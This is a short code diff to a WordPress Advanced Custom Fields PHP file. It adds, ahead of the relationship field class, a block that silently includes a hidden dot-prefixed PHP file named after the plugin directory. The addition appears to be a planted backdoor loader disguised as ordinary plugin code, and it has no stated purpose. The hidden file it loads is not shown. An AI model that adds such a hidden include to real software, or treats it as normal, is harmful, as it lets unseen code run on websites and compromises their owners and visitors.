@@ -2,6 +2,10 @@
 
 if( ! class_exists('acf_field_relationship') ) :
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class acf_field_relationship extends acf_field {
 	
 	
